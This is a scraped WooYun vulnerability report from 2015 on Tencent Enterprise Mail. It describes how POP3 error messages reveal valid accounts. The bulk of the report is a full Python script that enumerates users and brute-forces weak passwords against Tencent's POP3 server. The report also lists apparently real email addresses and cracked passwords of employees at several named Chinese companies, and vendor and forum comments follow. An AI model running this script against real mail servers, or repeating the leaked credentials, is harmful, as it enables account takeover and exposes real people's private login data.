{"id": 71217, "wybug_id": "wooyun-2015-0145012", "wybug_title": "腾讯企业邮箱一处设计缺陷（附邮箱爆破脚本）", "wybug_corp": "腾讯", "wybug_author": "null_z", "wybug_date": "2015-10-06 14:02", "wybug_open_date": "2015-11-22 15:24", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感接口缺乏校验"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向公众公开  简要描述： ～～～～ 详细说明：  这几天做邮箱爆破工具时候发现几个小问题。腾讯企业邮箱爆破的时候会返回一下两种常见错误\n1.ERR 登录失败，用户不存在，login failed2 .ERR 密码错误或者POP服务未开通。若POP服务未开通，详细说明请查看: http://service.mail.qq.com/cgi-bin/help?subtype=1&&id=28&&no=166 INCORRECT PASSWORD OR ACCOUNT IS NOT ENABLED FOR POP ACCESS. IF ACCOUNT IS NOT ENABLED, FOR MORE DETAILS PLEASE VISIT: http://service.mail.qq.com/cgi-bin/help?subtype=1&&id=28&&no=166\n对于企业邮箱用户而言pop服务是默认开启的，几乎没有企业关闭这个选项。所以要么用户不存在，要么是密码错误。这意味着我们可以知道那些用户是存在的，写个爆破脚本+top10000用户名即可轻松获取一个企业大致员工姓名。这算不算一个漏洞呢？我们来对比一下163企业邮箱腾讯企业邮箱\n\n163企业邮箱\n\n结果很显然。在防爆破问题上163邮箱的措施是\n\n而腾讯企业邮箱防爆破上限制也比较宽松对同一个账户试探密码次数过多应该师二十次左右才会出问题，导致无法继续下去，那么我们可以这样，存在的用户逐一试探top10弱口令。工具如下，逻辑是先判断用户是否存在，如果存在top10弱口令爆破，不存在跳过。弱口令规则['Asdf1234','Qwer1234','Abcd1234','a123456',name[0].upper()+name[1:]+'123',name+'123',name+'1234'，domain+'123',domain+'1234']\n#!/usr/bin/python#-*-coding:utf-8-*-'''mail_hunter for brute mail weakpass'''import poplibimport argparseimport osdef tencent(usernames,suffix):    server=\"pop.exmail.qq.com\"    domain_local=suffix.split('.')[0]    try:         pop = poplib.POP3_SSL(server,995)         welcome = pop.getwelcome()         print welcome         pop.quit()     except (poplib.error_proto):         print  \"No Response\"     users=[]    with open(usernames,'rb') as userFile:        while True:            user=userFile.readline().strip()            if user=='':                break            users.append(user+'@'+suffix)    for i in range(0,len(users)):        name=users[i].split('@')[0]        try:            pop=poplib.POP3_SSL(server,995)            pop.user(users[i])            auth=pop.pass_(name)            if auth==\"+OK\":                pop.quit()                print \"\\n\"+\"[SUCCESS]:\"+users[i]+'-----'+name+'\\n'            else:                pop.quit()        except Exception,e:            e=str(e).decode('gbk')            if e.count(u'密码错误或者')>0:                print users[i]+\"---\"+\"exists brute for passwd\"                passwds=[]                passwds.append(domain_local+'@123')                weak_value=['Asdf1234','Qwer1234','Abcd1234','a123456',name[0].upper()+name[1:]+'123',name+'123',name+'1234']                passwds.extend(weak_value)                if len(domain_local)<4:                    passwds.append(domain_local+'1234')                    passwds.append(domain_local[0].upper+domain_local[1:]+'1234')                else:                    passwds.append(domain_local+'123')                    passwds.append(domain_local[0].upper()+domain_local[1:]+'123')                                   for passwd in passwds:                    try:                        pop=poplib.POP3_SSL(server,995)                        print \"[try]\"+users[i]+'----'+passwd                        pop.user(users[i])                        auth=pop.pass_(passwd)                        #mm=str(auth).decode('gbk')                        #print \"this is auth:\"+mm                        if auth==\"+OK\":                            pop.quit()                            print \"\\n\"+\"[SUCCESS]:\"+users[i]+'-----'+passwd+'\\n'                            break                        else:                            pop.quit()                    except Exception,e:                        pass            else:                print users[i]+'---',                print eif __name__==\"__main__\":    parser=argparse.ArgumentParser()    parser.add_argument('-u','--username',dest='username',help='wordlist of username',required=True)    parser.add_argument('-s','--suffix',dest='suffix',help='suffix of mail',required=True)    arg=parser.parse_args()    usernames=arg.username    suffix=arg.suffix    tencent(usernames,suffix)\n使用效果\n\n这两天我拿使用腾讯企业邮箱的企业测试几乎没有不出问题的企业。\n好大夫zhangyan@haodf.com----haodf123lifang@haodf.com----haodf123zhangrui@haodf.com----haodf123zhoujing@haodf.com----Asdf1234人人车pr@renrenche.com----pr1234wangchao@renrenche.com-----renrenche@123wangxin@renrenche.com-----renrenche@123爱投资wangliang@itouzi.com----a123456mail:liubo@itouzi.com----a123456趣分期zhangtao@qufenqi.com----Qufenqi123雷锋网lifeng@leiphone.com----leiphone123阿姨帮mail:test@ayibang.com----test123mail:lijun@ayibang.com----lijun123这只是第一次爆破海可以导出通讯录进行二次爆破\n   漏洞证明：  以上   修复方案：  ～～～   版权声明：转载请注明来源 null_z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2015-10-08 15:23 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-08 15:38 |    \t\t小螺号 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:10        | 小螺号呀嘀嘀的~~~~~~吹)\t\t \n  默认smtp等客户端协议全开么。而且关不了么？？？？？？？？    \n     2015-10-08 17:14 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2822 漏洞数:565        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  R...    \n     2015-10-08 18:09 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2104 漏洞数:290        | 天天向上 ！！！)\t\t \n  2...    \n     2015-10-08 20:44 |    \t\t撸管 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:6        | 别人笑我太猥琐,我笑着朝她猛颜射)\t\t \n  2 RANK 配不上小三的努力    \n     2015-10-08 21:43 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:53        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  2 RANK 配不上小三的努力    \n     2015-10-11 00:11 |    \t\t努力的小三 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 暂无，新人)\t\t \n  2 RANK 配不上小三的努力    \n     2015-10-11 20:35 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1758 漏洞数:146        | 如果大海能够带走我的矮丑...)\t\t \n  2 RANK 配不上小三的努力    \n     2015-10-17 11:26 |    \t\tRand0m \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:4        | 真的有一米八五。。)\t\t \n  2 RANK 配不上小三的努力    \n     2015-10-21 18:59 |    \t\ttodaro \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:12        | 完结。)\t\t \n  作孽啊    \n     2015-10-28 15:37 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1038 漏洞数:176        | px1624)\t\t \n  作孽啊 作孽啊    \n     2015-11-02 22:08 |    \t\t啊L川 \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  作孽啊 作孽啊 作孽啊    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}